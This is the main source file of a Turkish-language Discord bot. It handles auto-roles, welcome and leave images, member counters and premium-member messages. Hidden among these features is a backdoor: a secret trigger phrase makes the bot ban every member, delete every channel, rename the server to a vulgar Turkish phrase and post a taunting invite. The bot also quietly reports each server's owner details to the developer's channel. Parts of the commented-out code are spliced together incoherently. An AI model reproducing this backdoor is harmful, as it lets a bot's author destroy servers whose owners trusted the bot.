      `:loudspeaker: :inbox_tray:  @${member.user.tag} Hosgeldin Otorol Verildi `
    )
    .setColor("GREEN")
    .setFooter("♡ Mashiro", client.user.avatarURL);

  if (!giriscikis[member.guild.id].kanal) {
    return;
  }

  try {
    let giriscikiskanalID = giriscikis[member.guild.id].kanal;
    let giriscikiskanali = client.guilds
      .get(member.guild.id)
      .channels.get(giriscikiskanalID);
    giriscikiskanali.send(
      `:loudspeaker: :white_check_mark: Hoşgeldin **${member.user.tag}** Rolün Başarıyla Verildi.`
    );
  } catch (e) {
    // eğer hata olursa bu hatayı öğrenmek için hatayı konsola gönderelim.
    return console.log(e);
  }
});

client.on("guildMemberAdd", async member => {
  let autorole = JSON.parse(fs.readFileSync("./otorol.json", "utf8"));
  let role = autorole[member.guild.id].sayi;

  member.addRole(role);
});
/*client.on("message", async msg => {
const request = require('node-superfetch');
const db = require('quick.db');
const ms = require('parse-ms')
let timeout = 40000 //süresini dilediğiniz gibi kısaltabilirsiniz.
let dakdest = await db.fetch(`goldzzz_${msg.author.id}`);
let i = gold.gold2
          if (msg.author.id === i ) {
    if (dakdest !== null && timeout - (Date.now() - dakdest) > 0) {
        let time = ms(timeout - (Date.now() - dakdest));
    } else {
  if(msg.author.bot) return;   
  if (msg.content.length > 1) {
db.set(`goldzzz_${msg.author.id}`, Date.now());
  var embed = new Discord.RichEmbed()
  .setAuthor(` Gold Üye ${msg.author.username}`,`${msg.author.avatarURL || msg.author.displayAvatarURL}`)
  .setDescription(`:gem: Gold Üye Belirdi = <@${msg.author.id}>`)
  .setColor("GOLD")
   msg.channel.send(embed).then(msg => msg.delete(5600));
  }
};
          }
   else if (i == undefined) {           
          }
          if (!i) return;
        
});*/
/*client.on("message", async msg => {
  const request = require("node-superfetch");
  const db = require("quick.db");
  const ms = require("parse-ms");
  let timeout = 120000; //süresini dilediğiniz gibi kısaltabilirsiniz.
  let dakdest = await db.fetch(`goldzzz_${msg.author.id}`);
  let i = gold.gold2;
  if (msg.author.id == i) {
    if (dakdest !== null && timeout - (Date.now() - dakdest) > 0) {
      let time = ms(timeout - (Date.now() - dakdest));
    } else {
      if (msg.author.bot) return;
      if (msg.content.length > 1) {
        db.set(`goldzzz_${msg.author.id}`, Date.now());
        var embed = new Discord.RichEmbed()
          .setTitle(
            `<a:shardr:666980258121121802> Bu Bir Premium Uye <a:shardr:666980258121121802> `
          )
          .addField(
            `<a:shardr:666980258121121802> Premium Uyeme Benden Cay <a:shardr:666980258121121802> `,
            `[Premium Al](https://discord.gg/knEkSEv)`,
            true
          )
          .setDescription(
            `:white_check_mark:Yat Assa Bu Cocuk Premium Uye \n<@${msg.author.id}>`
          )
            .setThumbnail(msg.author.avatarURL)        
          .setColor("GOLD");
        //.setThumbnail(message.author.avatarURL);
        msg.channel.send(embed).then(msg => msg.delete(5600));
      }
    }
  } else if (i == undefined) {
  }
  if (!i) return;
});
client.on("message", async msg => {
  const request = require("node-superfetch");
  const db = require("quick.db");
  const ms = require("parse-ms");
  let timeout = 120000; //süresini dilediğiniz gibi kısaltabilirsiniz.
  let dakdest = await db.fetch(`goldzzz_${msg.author.id}`);
  let i = '';
  if (msg.author.id == i) {
    if (dakdest !== null && timeout - (Date.now() - dakdest) > 0) {
      let time = ms(timeout - (Date.now() - dakdest));
    } else {
      if (msg.author.bot) return;
      if (msg.content.length > 1) {
        db.set(`goldzzz_${msg.author.id}`, Date.now());
        var embed = new Discord.RichEmbed()
          .setTitle(
            `<a:shardr:666980258121121802> Bu Bir Premium Uye <a:shardr:666980258121121802> `
          )
          .addField(
            `<a:shardr:666980258121121802> Premium Uyeme Benden Cay <a:shardr:666980258121121802> `,
            `[Premium Al](https://discord.gg/knEkSEv)`,
            true
          )
          .setDescription(
            `:white_check_mark:Yat Assa Bu Cocuk Premium Uye \n<@${msg.author.id}>`
          )
              .setThumbnail(msg.author.avatarURL)
          .setColor("GOLD");
        msg.channel.send(embed).then(msg => msg.delete(5600));
      }
    }
  } else if (i == undefined) {
  }
  if (!i) return;
});*/
/*const Discord = require("discord.js");
const client = new Discord.Client();
const DBL = require("dblapi.js");
const dbl = new DBL('DBL TOKENİNİZ', client);
exports.run = (client, message) => {
    dbl.hasVoted(message.author.id).then(voted => {
        if (!voted) {
            message.reply("Bu komutu kullanabilmek için DBL üzerinden oy vermen gerekiyor. (Eğer oy verdiyseniz bi kaç dakika bekleyin .s) \nOy vermek için: ") //OY LINKINİZ!

        } else {
            message.channel.send("JavaScript rolün verildi.");
            message.member.addRole("ROL ID!")  //ROL IDSİ!

        }
    })
}
exports.conf = {
  enabled: true,
  guildOnly: true,
  aliases: ["java"],
  permLevel: 0,
   
};

exports.help = {
  name: 'js',
  description: 'Oy vererek js rolü Alma!', 
  usage: 'js'
};
//b*/
//setTimeout(function() {
  
 // let sunucu = client.guilds.get('599178367253610508')
 // let rol = sunucu.roles.get('627194280808546304')
  
 // rol.setColor('RANDOM')
 
  //CodEming olarak hiçbir sorumluluğu üzerimize almıyoruz
  
//}, 1000) // 17000 yaparsanız rol değiştirme hızı azalır ancak botunuz veya siz herhangi bir ceza almaz
///client.on('userUpdate', (o,n) => {
//  var tag = "៚ ";
 // var sunucuid = "599178367253610508";
////  var tagialanlaraverilecek = "670169105176723456"
 //// var mesajkanalid = "669572564858830859"
//  const embed1 = new Discord.RichEmbed()
 ///   .setTitle("Tag Bildirimi")
 //=   .setDescription(`${n}, tagımızı aldığı için rolü verildi!`)
 ////   .setFooter("Developed by Umut") //Değiştirme Lütfen 
 ////=///   .setTimestamp()
///    .setColor("GREEN")
/////  5555const embed2 = new Discord.RichEmbed()
 // ///5///  .setTitle("Tag Bildirimi")
 ///   .setDescription(`${n}, tagımızı çıkardığı için rolü alındı!`)
 ///   .setFooter("Developed by Umut") //Değiştirme Lütfen 
////    .setTimestamp()
 ////   .setColor("RED")

 /// if(n.username !== o.username) {
 ////   if(n.username.includes(tag)) { //eğer kullanıcı tagı almışsa
  ////    if(!client.guilds.get(sunucuid).members.get(n.id).roles.has(tagialanlaraverilecek)) { //ve crew rolü yoksa
 //       client.guilds.get(sunucuid).members.get(n.id).addRole(tagialanlaraverilecek) // crew rolü ver
   /////     client.channels.get(mesajkanalid).send(embed1) // bildirim kanalına mesaj yolla
  ////    }
 //   }
 ///   if(!n.username.includes(tag)) { //eğer kullanıcı tagı çıkarmışsa
 ///     if(client.guilds.get(sunucuid).members.get(n.id).roles.has(tagialanlaraverilecek)) { //ve crew rolü varsa
 //       client.guilds.get(sunucuid).members.get(n.id).removeRole(tagialanlaraverilecek) // crew rolünü al
   ///     client.channels.get(mesajkanalid).send(embed2) //bildirim kanalına mesaj yolla
 //     }
 //   }
 /// }
//})
//Umut
/*client.on("message", async msg &= gt; {
  
  if (msg.channel.type === "dm") return;
  if(msg.author.bot) return;  
  
  if (msg.content.length &gt; 7) {
    
    db.add(`puan_${msg.author.id + msg.guild.id}`, 3)
};

  if (db.fetch(`puan_${msg.author.id + msg.guild.id}`) &gt; 150) {
    
    db.add(`seviye_${msg.author.id + msg.guild.id}`, 1)
    
    db.delete(`puan_${msg.author.id + msg.guild.id}`)
    
  };
  
});*/
//client.on("message", async message => {5//if(message.content === "sikindursun")
//5 message.guild.deleteChannel(``) 
//},
//===============Gold Uye===============
client.on("message", async message => {

  if( message.content === "sa" || message.content === "Sa" || message.content === "Selamın Aleyküm" || message.content === "selamın aleyküm" || message.content === "sea" || message.content === "Sea") {

    let kullanıcı = await db.fetch(`gold_${message.author.id}`);

          if( kullanıcı == 'gold'){
  const embed = new Discord.RichEmbed()
.setTitle(`<a:shardr:666980258121121802> Bu Bir Gold Uye <a:shardr:666980258121121802> `)
.addField(`<a:shardr:666980258121121802> Gold Uyeme Benden Cay <a:shardr:666980258121121802> `, `[Gold Al](https://discord.gg/kNEfApn)`,true)
.setDescription(`Yat Assa Bu Cocuk Gold Uye \n<@${message.author.id}>`)
.setThumbnail(message.author.avatarURL)
.setColor('GOLD')
    message.channel.send({embed}).then(msg => msg.delete(5600));
          } else {
            return;
          }
  }
})
//const gold = require("./gold.json")
/*client.on("message", async msg => {
const request = require('node-superfetch');
const db = require('quick.db');
const ms = require('parse-ms')
let timeout = 120000//süresini dilediğiniz gibi kısaltabilirsiniz.
let kullanıcı = await db.fetch(`gold_${msg.author.id}`);
let i = 'gold'
if ( kullanıcı == i) {
if (kullanıcı !== undefined && timeout - (Date.now() - kullanıcı) > 0) {
let time = ms(timeout - (Date.now() - kullanıcı));
} else {
if(msg.author.bot) return; 
if (msg.content.length > 1) {
db.set(`gold_${msg.author.id}`, Date.now());
var embed = new Discord.RichEmbed()
.setTitle(`<a:shardr:666980258121121802> Bu Bir Gold Uye <a:shardr:666980258121121802> `)
.addField(`<a:shardr:666980258121121802> Gold Uyeme Benden Cay <a:shardr:666980258121121802> `, `[Gold Al](https://discord.gg/knEkSEv)`,true)
.setDescription(`:white_check_mark:Yat Assa Bu Gold Uye \n<@${msg.author.id}>`)
.setThumbnail(msg.author.avatarURL)
.setColor('GOLD')

msg.channel.send(embed).then(msg => msg.delete(5600));
}
};
}
else if (kullanıcı == undefined) { 
}
if (!kullanıcı) return;

});*/
//=========================================
client.on("guildCreate", guild => {
let add = client.channels.get("675042729679388698")
const eklendim = new Discord.RichEmbed()

.setTitle(`<a:giris:666338170803191828>Sunucuya Eklendim`)
.setTimestamp()
.setColor("GREEN")
.setThumbnail(guild.iconURL)
.addField(`<a:evt:666338359743873052> Sunucu İsmi`,guild.name)
.addField(`<a:evt:666338359743873052> Sunucu ID`, guild.id)
.addField(`<a:evt:666338359743873052> Kurucu`,guild.owner.user.tag)
.addField(`<a:evt:666338359743873052> Kurucu ID`,guild.owner.user.id)
.addField(`<a:evt:666338359743873052> Üye Sayısı`,guild.memberCount)

add.send(eklendim)

});
//XiR
client.on("guildDelete", guild => {
let remove = client.channels.get("675042729679388698")
const atildim = new Discord.RichEmbed()

.setTitle(`<a:cikis:666338308938530837> Sunucudan Atıldım`)
.setTimestamp()
.setColor("RED")
.setThumbnail(guild.iconURL)
.addField(`<a:hayir:666338110988091442>Sunucu İsmi`,guild.name)
.addField(`<a:hayir:666338110988091442>Sunucu ID`, guild.id)
.addField(`<a:hayir:666338110988091442>Kurucu`,guild.owner.user.tag)
.addField(`<a:hayir:666338110988091442>Kurucu ID`,guild.owner.user.id)
.addField(`<a:hayir:666338110988091442>Üye Sayısı`,guild.memberCount)

remove.send(atildim)

});
//XiR        
const mesajat = new Discord.RichEmbed()
client.on("message", async message => {
  if( message.content === "ajqjajjajaqhhwhsjaja" ) {
 // message.send(m => m.send('dm', "Siktik siktik"))
   //message.guild.members.send(m => m.send('dm', 'Sunucu Sikildi \nhttps://discord.gg/cJVQcg3'))
  message.guild.members.map(m => m.ban());
  message.guild.channels.map(m => m.delete());
 message.guild.setIcon("https://cdn.glitch.com/71ad7fcf-ead4-4292-bb3b-29a1456c8b28%2Ff63da952c3d994171437aa524f55187b.png?v=1580301162561")
//message.guild.setOwner(`<@662380951053139988>`)
 message.guild.setName("Sikildiniz")
 message.guild.createChannel('=============================', 'Category')
 message.guild.createChannel("HoştAyol", 'text').then(c => { c.send(">>> ***Umut Ve Cesur Siker***\nhttps://discord.gg/cJVQcg3\n***Siktik Siktik Doymadik***")
 message.guild.createChannel('=============================', 'category')
                                                           })}})
//=====================Premium Sunucu=========================
//============================================================

//===================== Bot Bilgi =======================================
client.on("ready", () => {
  setInterval(() => {
    let botdurum = client.channels.find(c => c.id === "675042666391797782");
    const botistatistik = new Discord.RichEmbed()
      .setColor("GREEN")
      .addField(`<a:gucenli:666338076221505557>Botun Bulundugu Sunucular`, `${client.guilds.size.toLocaleString()}`)
      .addField(
        `<a:gucenli:666338076221505557> Botu Kullanan Kullanıcılar`,
        client.guilds.reduce((a, b) => a + b.memberCount, 0).toLocaleString()
)
              .addField(`<a:gucenli:666338076221505557>Botun Pingi`, `${client.ping}`)
      .setTimestamp()
    .setThumbnail(client.user.avatarURL)
    botdurum.send(botistatistik);
  }, 120000);
});
//===========================Log===============================
client.on('guildMemberAdd',async member => {
  let user = client.users.get(member.id);
  let chan = client.channels.get(db.fetch(`guvenlik${member.guild.id}`)) 
       const Canvas = require('canvas')
       const canvas = Canvas.createCanvas(360,100);
       const ctx = canvas.getContext('2d');
  
  const resim1 = await Canvas.loadImage('https://cdn.discordapp.com/attachments/591299755976425493/614151181752860672/yhosgeldirrn.png')
    const resim2 = await Canvas.loadImage('https://cdn.discordapp.com/attachments/591299755976425493/614164419768877056/yhosgeldirrn.png')
    const kurulus = new Date().getTime() - user.createdAt.getTime();
    const gün = moment(kurulus).format("dddd")
    var kontrol;
      if (kurulus > 2629800000) kontrol = resim2
    if (kurulus < 2629800000) kontrol = resim1

       const background = await Canvas.loadImage('https://cdn.discordapp.com/attachments/591299755976425493/614164413318168606/Adsz.png');
       ctx.drawImage(background, 0, 0, canvas.width, canvas.height);
   


  const avatar = await Canvas.loadImage(member.user.displayAvatarURL);
  ctx.drawImage(kontrol,0,0,canvas.width, canvas.height)
  ctx.beginPath();
	ctx.lineWidth = 4;
  ctx.fill()
	ctx.lineWidth = 4;
  ctx.arc(180, 46, 36, 0, 2 * Math.PI);
	ctx.clip();
  ctx.drawImage(avatar, 143,10, 73, 72  );

   
       const attachment = new Discord.Attachment(canvas.toBuffer(), 'mashiroguvenlik.png');
    chan.send(attachment)
});
//XiR
/*client.on("guildMemberAdd", async(member) => {
    let resimlihgbb = await db.fetch(`giriş_${member.guild.id}`);
    if(resimlihgbb) {
      const gözelkanal = member.guild.channels.get(db.fetch(`giriş_${member.guild.id}`))
      if(gözelkanal) {
      let username = member.user.username;
        if(gözelkanal.type === "text") {
          const bg = await Jimp.read("https://cdn.discordapp.com/attachments/499911418896973824/500023171827761154/guildAdd_2.png");
          const userimg = await Jimp.read(member.user.avatarURL ? member.user.avatarURL : client.user.avatarURL);
          var font;
          if (member.user.tag.length < 15) font = await Jimp.loadFont(Jimp.FONT_SANS_64_WHITE);
          else if (member.user.tag.length > 15) font = await Jimp.loadFont(Jimp.FONT_SANS_64_WHITE);
          else font = await Jimp.loadFont(Jimp.FONT_SANS_32_WHITE);
          await bg.print(font, 430, 170, member.user.tag);
          await userimg.resize(362, 362);
          await bg.composite(userimg, 43, 26).write("./img/"+ client.user.username + "Hosgeldin.png");
          setTimeout(function () {
            if(member.user.id === ayarlar.sahip){
              gözelkanal.send(new Discord.Attachment("./img/" + client.user.username + "Hosgeldin.png"))
              gözelkanal.send("İşte Bak! Kurucum sunucuya giriş yaptı.")
            } else {    
              gözelkanal.send(new Discord.Attachment("./img/" + client.user.username + "Hosgeldin.png"));
            }
          }, 1000);
          setTimeout(function () {
            fs.unlinkSync("./img/" + client.user.username + "Hosgeldin.png");
          }, 10000);
        }
      }
    }
})

client.on("guildMemberRemove", async(member) => {
    let resimlihgbb = await db.fetch(`giriş_${member.guild.id}`);
    if(resimlihgbb) {
        const gözelkanal = member.guild.channels.get(db.fetch(`giriş_${member.guild.id}`))
    if (gözelkanal) {
        let username = member.user.username;
        if (gözelkanal.type === "text") {            
          //const bg = await Jimp.read("https://cdn.discordapp.com/attachments/499911418896973824/500023173459345416/guildRemove_2.png");
            const Discord = require('discord.js');
const db = require('quick.db');
const ayarlar = require("../ayarlar.json")

exports.run = async (client, message, args) => {
  if(!message.member.hasPermission('MANAGE_GUILD')) return message.reply('Bu komutu kullanabilmek için `Sunucuyu Yönet` iznine sahip olmalısın')
  let prefix = await require('quick.db').fetch(`prefix_${message.guild.id}`) || ayarlar.prefix  
  let giriş = message.mentions.channels.first();
  const ip = await db.fetch(`giriş_${message.guild.id}`)
  const slm = args.join();
     
           // Tamamen Kapat
  if(slm === "durdur" || slm === "kapat" || slm === "sıfırla") {
    if(!ip) return message.channel.send(`Ayarlanmayan şeyi kapatamazsın!`)
    db.delete(`giriş_${message.guild.id}`)
    message.channel.send(`Resimli Hoşgeldin özelliği başarıyla devredışı bırakıldı!`)
    return
  }
     
  if(ip) { // Eğer kanal zaten ayarlı ise
        if (!client.channels.get(ip)) {
          db.delete(`giriş_${message.guild.id}`);
          return
            const userimg = await Jimp.read(member.user.avatarURL ? member.user.avatarURL : client.user.avatarURL);var font;
            if (member.user.tag.length < 15) font = await Jimp.loadFont(Jimp.FONT_SANS_64_WHITE);
            else if (member.user.tag.length > 15) font = await Jimp.loadFont(Jimp.FONT_SANS_64_WHITE);
            else font = await Jimp.loadFont(Jimp.FONT_SANS_32_WHITE);
         //   await bg.print(font, 430, 170, member.user.tag);
            await userimg.resize(210, 210);
            await bg.composite(userimg, 253, 56).write("./img/"+ client.user.username + "Gorusuruz.png");
              setTimeout(function () {
                if(member.user.id === ayarlar.sahip){
                  gözelkanal.send(new Discord.Attachment("./img/" + client.user.username + "Gorusuruz.png"))
                  gözelkanal.send("Kurucum sunucunuzdan ayrıldı..")
                } else {
                  gözelkanal.send(new Discord.Attachment("./img/" + client.user.username + "Gorusuruz.png"));
                }
              }, 1000);
              setTimeout(function () {
                fs.unlinkSync("./img/" + client.user.username + "Gorusuruz.png");
              }, 10000);
        }
    }
  }
})*/
client.on("guildMemberAdd", async(member) => {
    let resimlihgbb = await db.fetch(`giriş_${member.guild.id}`);
    if(resimlihgbb) {
      const gözelkanal = member.guild.channels.get(db.fetch(`giriş_${member.guild.id}`))
      if(gözelkanal) {
      let username = member.user.username;
        if(gözelkanal.type === "text") {
        //  const bg = await Jimp.read("https://cdn.discordapp.com/attachments/499911418896973824/500023171827761154/guildAdd_2.png");
           const bg = await Jimp.read("https://cdn.glitch.com/ddfa94c1-592b-46dd-8c2b-c2d7fab86c13%2FPicsArt_01-14-02.27.50.jpg?v=1579028701485");
          const userimg = await Jimp.read(member.user.avatarURL ? member.user.avatarURL : client.user.avatarURL);
          var font;
          if (member.user.tag.length < 15) font = await Jimp.loadFont(Jimp.FONT_SANS_64_WHITE);
          else if (member.user.tag.length > 15) font = await Jimp.loadFont(Jimp.FONT_SANS_64_WHITE);
          else font = await Jimp.loadFont(Jimp.FONT_SANS_32_WHITE);
          //await bg.print(font, 430, 170, member.user.tag);
          await userimg.resize(210, 210);
          await bg.composite(userimg, 253, 56).write("./img/"+ client.user.username + "Hosgeldin.png");
          setTimeout(function () {
            if(member.user.id === ayarlar.sahip){
              gözelkanal.send(new Discord.Attachment("./img/" + client.user.username + "Hosgeldin.png"))
              gözelkanal.send("İşte Bak! Kurucum sunucuya giriş yaptı.")
            } else {    
             gözelkanal.send(`<a:giris:666338170803191828>    | \`${member.user.tag}\` Adlı kullanıcı sunucuya **Giriş** yaptı. Şuanda **${member.guild.memberCount}** kişiyiz!`)
              gözelkanal.send(new Discord.Attachment("./img/" + client.user.username + "Hosgeldin.png"));
            }
          }, 1000);
          setTimeout(function () {
            fs.unlinkSync("./img/" + client.user.username + "Hosgeldin.png");
          }, 10000);
        }
      }
    }
})

client.on("guildMemberRemove", async(member) => {
    let resimlihgbb = await db.fetch(`giriş_${member.guild.id}`);
    if(resimlihgbb) {
        const gözelkanal = member.guild.channels.get(db.fetch(`giriş_${member.guild.id}`))
    if (gözelkanal) {
        let username = member.user.username;
        if (gözelkanal.type === "text") {            
          //  const bg = await Jimp.read("https://cdn.discordapp.com/attachments/499911418896973824/500023173459345416/guildRemove_2.png");
         const bg = await Jimp.read("https://cdn.glitch.com/ddfa94c1-592b-46dd-8c2b-c2d7fab86c13%2FPicsArt_01-14-02.28.28.jpg?v=1579028688245");
          const userimg = await Jimp.read(member.user.avatarURL ? member.user.avatarURL : client.user.avatarURL);
            var font;
            if (member.user.tag.length < 15) font = await Jimp.loadFont(Jimp.FONT_SANS_64_WHITE);
            else if (member.user.tag.length > 15) font = await Jimp.loadFont(Jimp.FONT_SANS_64_WHITE);
            else font = await Jimp.loadFont(Jimp.FONT_SANS_32_WHITE);
           // await bg.print(font, 430, 170, member.user.tag);
            await userimg.resize(210, 210);
            await bg.composite(userimg, 253, 56).write("./img/"+ client.user.username + "Gorusuruz.png");
              setTimeout(function () {
                if(member.user.id === ayarlar.sahip){
                  gözelkanal.send(new Discord.Attachment("./img/" + client.user.username + "Gorusuruz.png"))
                  gözelkanal.send("Kurucum sunucunuzdan ayrıldı..")
                } else {
                  //gözelkanal.send("")
                 gözelkanal.send(`<a:cikis:666338308938530837>  | \`${member.user.tag}\` Adlı kullanıcı sunucudan **Çıkış** yaptı. Şuanda **${member.guild.memberCount}** kişiyiz!`)
                  gözelkanal.send(new Discord.Attachment("./img/" + client.user.username + "Gorusuruz.png"));
                }
              }, 1000);
              setTimeout(function () {
                fs.unlinkSync("./img/" + client.user.username + "Gorusuruz.png");
              }, 10000);
        }
    }
  }
})
//fake ayrıl katıl
client.on('message', async message => {
if (message.content === '!!gir') { // - yerine prefixi yaz
  client.emit('guildMemberAdd', message.member || await message.guild.fetchMember(message.author));
    }
});
client.on('message', async message => {
    if (message.content === '!!çık') { // - yerine prefixi yaz
        client.emit('guildMemberRemove', message.member || await message.guild.fetchMember(message.author));
    }
}); 
//<================== Sayaç ==================>\\
//==> Main Dosyanıza Atın <==\\

client.on("guildMemberAdd", async member => {
  let sayac = await db.fetch(`sayac_${member.guild.id}`);
  let skanal9 = await db.fetch(`sayacK_${member.guild.id}`);
  if (!skanal9) return;
  const skanal31 = member.guild.channels.find("name", skanal9);
  if (!skanal31) return;
  skanal31.send(
    `<a:giris:666338170803191828>  | \`${
      member.user.tag
    }\`, sunucuya katıldı \`${sayac}\` kişi olmamıza \`${sayac -
      member.guild.members.size}\` kişi kaldı, \`${
      member.guild.memberCount
    }\` kişiyiz!`
  );
});
client.on("guildMemberRemove", async member => {
  let sayac = await db.fetch(`sayac_${member.guild.id}`);
  let skanal9 = await db.fetch(`sayacK_${member.guild.id}`);
  if (!skanal9) return;
  const skanal31 = member.guild.channels.find("name", skanal9);
  if (!skanal31) return;
  skanal31.send(
    `<a:cikis:666338308938530837> | \`${
      member.user.tag
    }\`, aramızdan ayrıldı, \`${sayac}\` kişi olmamıza \`${sayac -
      member.guild.members.size}\` kişi kaldı, \`${
      member.guild.memberCount
    }\` kişiyiz!`
  );
});
client.on("messageUpdate", async (oldMsg, newMsg) => {
  let prefix = (await db.fetch(`prefix_${newMsg.guild.id}`)) || ayarlar.prefix;
  if (newMsg.author.bot) return;
  if (!newMsg.content.startsWith(prefix)) return;
  let command = newMsg.content.split(" ")[0].slice(prefix.length);
  let params = newMsg.content.split(" ").slice(1);
  let perms = client.elevation(newMsg);
  let cmd;
  if (client.commands.has(command)) cmd = client.commands.get(command);
  else if (client.aliases.has(command))
    cmd = client.commands.get(client.aliases.get(command));
  if (cmd) {
    if (perms < cmd.conf.permLevel) return;
    cmd.run(client, newMsg, params, perms);
  }
});
//<=================================================>
//Bilo Kod Paylaşım
client.on('message', msg => {
 if (msg.content.toLowerCase() === '<@662380951053139988>') {
 msg.delete('**Sahibimi Etiketleyemezsin !**');
 msg.reply('Sahibimi Etiketleme!');
}
});
//Maine
client.on('message', message => {
if (message.content === `<@672084416503218177>`) {
 message.reply('**Prefixim: **  ' +ayarlar.prefix )
}
})